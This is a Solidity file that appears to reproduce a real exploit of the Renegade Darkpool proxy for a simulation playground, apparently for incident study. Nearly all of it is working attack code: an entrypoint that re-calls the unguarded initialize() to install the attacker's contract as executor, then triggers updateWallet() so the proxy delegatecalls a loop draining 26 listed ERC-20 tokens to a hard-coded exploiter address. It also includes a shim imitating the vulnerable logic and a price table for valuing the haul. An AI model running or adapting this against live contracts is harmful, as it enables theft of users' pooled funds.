// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Standalone synthetic exploit for the EVM Playground, mirroring
// test/Renegade_exp.sol's RenegadeExploitContract + RenegadeStylusInitializeShim
// 1:1 (same selectors, same storage behaviour, same drain loop). The ONLY
// difference from the real Foundry PoC is that this file drops the
// `RenegadeTest is Test` wrapper (forge-std cheatcodes, fork setup, assertions) —
// the playground's build pipeline handles forking/state-loading/assertions
// itself. `RenegadeStylusInitializeShim`'s compiled runtime bytecode is
// installed at the real Stylus implementation address via `codeOverrides` in
// 2026-05-Renegade.mjs (the playground's equivalent of the real test's
// `vm.etch(STYLUS_IMPLEMENTATION, ...)`), because the genuine implementation is
// unexecutable Arbitrum Stylus (Rust/WASM) bytecode that revm cannot run.
//
// See Renegade_exp.md for the full writeup: the Darkpool proxy's `initialize()`
// has no one-shot guard, so anyone can re-call it to overwrite the stored
// "injected logic" / executor address with their own contract. The very next
// `updateWallet()` call then `delegatecall`s that attacker-controlled address
// from the proxy's own storage/authority context, letting the attacker's code
// drain every ERC-20 the Darkpool holds.

contract RenegadeExploitContract {
    address internal constant EXPLOITER = 0x777253F28AdC29645152b7b41BE5c772A9657777;
    IRenegadeDarkPool internal constant DARK_POOL = IRenegadeDarkPool(0x30bD8eAb29181F790D7e495786d4B96d7AfDC518);

    // The single entrypoint recorded by the playground. Mirrors the real
    // attack tx exactly: re-initialize with our own address as the injected
    // executor, then trigger updateWallet so the proxy delegatecalls it.
    function attack() external {
        uint256[2] memory publicBlinder;

        DARK_POOL.initialize(
            address(this),
            address(0),
            address(0),
            address(0),
            address(0),
            address(0),
            address(0),
            address(0),
            address(0),
            address(0),
            0,
            publicBlinder,
            EXPLOITER
        );
        DARK_POOL.updateWallet("", "", "", "");
    }

    // Reached via delegatecall from the (shimmed) Stylus implementation, in the
    // Darkpool proxy's own storage context — so address(this) == the proxy and
    // every balanceOf/transfer below acts on the proxy's pooled assets.
    function drainTokens() external {
        for (uint256 i = 0; i < RenegadeTokenList.count(); i++) {
            address token = RenegadeTokenList.at(i);
            uint256 amount = IERC20(token).balanceOf(address(this));
            if (amount != 0) {
                require(IERC20(token).transfer(EXPLOITER, amount), "transfer failed");
            }
        }
    }
}

// Reproduces the two observable storage operations the real Arbitrum Stylus
// (Rust/WASM) implementation performed at the attack tx (see Renegade_exp.md
// "The vulnerable code" section): `initialize` stores the caller-supplied
// address with NO already-initialized check, and `updateWallet` delegatecalls
// whatever address is currently stored — with no proof/statement validation
// first, so the malicious executor is reached immediately.
contract RenegadeStylusInitializeShim {
    bytes4 internal constant INITIALIZE_SELECTOR = 0x92413afe;
    bytes4 internal constant UPDATE_WALLET_SELECTOR = 0x803f430a;
    address internal injectedLogic;

    fallback() external {
        require(msg.sig == INITIALIZE_SELECTOR || msg.sig == UPDATE_WALLET_SELECTOR, "unexpected Renegade selector");

        if (msg.sig == INITIALIZE_SELECTOR) {
            // BUG: no "already initialized" guard — slot 0 already held a
            // legitimate non-zero value from the real deployment, yet this
            // still overwrites it with whatever address the caller supplies.
            injectedLogic = abi.decode(msg.data[4:], (address));
            return;
        }

        // updateWallet: delegatecall the stored executor with NO proof/
        // statement validation beforehand. Once `injectedLogic` is the
        // attacker's contract, this is arbitrary code execution as the proxy.
        address logic = injectedLogic;
        require(logic != address(0), "missing injected logic");

        (bool ok, bytes memory ret) =
            logic.delegatecall(abi.encodeWithSelector(RenegadeExploitContract.drainTokens.selector));
        ret;
        require(ok, "injected delegatecall failed");
    }
}

interface IRenegadeDarkPool {
    function initialize(
        address injectedLogic,
        address verifier,
        address hasher,
        address transferExecutor,
        address permit2,
        address vkeys,
        address protocolFeeRecipient,
        address protocolFeeController,
        address relayer,
        address priceReporter,
        uint256 protocolFee,
        uint256[2] calldata publicBlinder,
        address owner
    ) external;

    function updateWallet(
        bytes calldata wallet,
        bytes calldata proof,
        bytes calldata statement,
        bytes calldata blinderSeed
    ) external;
}

library RenegadeTokenList {
    function count() internal pure returns (uint256) {
        return 26;
    }

    function decimals(uint256 index) internal pure returns (uint256) {
        if (index == 6) return 8;
        if (index == 18 || index == 25) return 6;
        return 18;
    }

    // Approximate USD prices with 8 decimals, used only to display the aggregate exploit value.
    function usdPriceE8(uint256 index) internal pure returns (uint256) {
        if (index == 1) return 1e8; // PENDLE
        if (index == 2) return 25_000_000; // CRV: $0.25
        if (index == 4) return 50_000_000; // LDO: $0.50
        if (index == 5) return 4e8; // LPT
        if (index == 6) return 100_000e8; // WBTC
        if (index == 8) return 1_000_000; // RDNT: $0.01
        if (index == 9) return 20e8; // COMP
        if (index == 11) return 1_500_000; // XAI: $0.015
        if (index == 13) return 1e8; // ZRO
        if (index == 14) return 50_000_000; // ETHFI: $0.50
        if (index == 15) return 2_400e8; // WETH
        if (index == 16) return 25_000_000; // ARB: $0.25
        if (index == 17) return 4_000_000; // GRT: $0.04
        if (index == 18) return 1e8; // USDC
        if (index == 20) return 80e8; // AAVE
        if (index == 22) return 8e8; // LINK
        if (index == 23) return 3e8; // UNI
        if (index == 24) return 8e8; // GMX
        if (index == 25) return 1e8; // USDT
        return 0;
    }

    function at(uint256 index) internal pure returns (address) {
        if (index == 0) return 0x0721b3C9f19cfeF1d622C918DcD431960f35E060;
        if (index == 1) return 0x0c880f6761F1af8d9Aa9C466984b80DAb9a8c9e8;
        if (index == 2) return 0x11cDb42B0EB46D95f990BeDD4695A6e3fA034978;
        if (index == 3) return 0x13ad3f1150db0e1e05fd32bDEeB7C110ee023de6;
        if (index == 4) return 0x13Ad51ed4F1B7e9Dc168d8a00cB3f4dDD85EfA60;
        if (index == 5) return 0x289ba1701C2F088cf0faf8B3705246331cB8A839;
        if (index == 6) return 0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f;
        if (index == 7) return 0x306fD3e7b169Aa4ee19412323e1a5995B8c1a1f4;
        if (index == 8) return 0x3082CC23568eA640225c2467653dB90e9250AaA0;
        if (index == 9) return 0x354A6dA3fcde098F8389cad84b0182725c6C91dE;
        if (index == 10) return 0x45D9831d8751B2325f3DBf48db748723726e1C8c;
        if (index == 11) return 0x4Cb9a7AE498CEDcBb5EAe9f25736aE7d428C9D66;
        if (index == 12) return 0x65C101E95D7DD475c7966330fa1A803205FF92aB;
        if (index == 13) return 0x6985884C4392D348587B19cb9eAAf157F13271cd;
        if (index == 14) return 0x7189fb5B6504bbfF6a852B13B7B82a3c118fDc27;
        if (index == 15) return 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
        if (index == 16) return 0x912CE59144191C1204E64559FE8253a0e49E6548;
        if (index == 17) return 0x9623063377AD1B27544C965cCd7342f7EA7e88C7;
        if (index == 18) return 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
        if (index == 19) return 0xb1425d5Bafc89A069421F69Ba57DBE2F23fC45f6;
        if (index == 20) return 0xba5DdD1f9d7F570dc94a51479a000E3BCE967196;
        if (index == 21) return 0xC5a861787f3e173F2b004d5cfA6a717f5DC5484D;
        if (index == 22) return 0xf97f4df75117a78c1A5a0DBb814Af92458539FB4;
        if (index == 23) return 0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0;
        if (index == 24) return 0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a;
        if (index == 25) return 0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9;
        revert("token index out of bounds");
    }
}
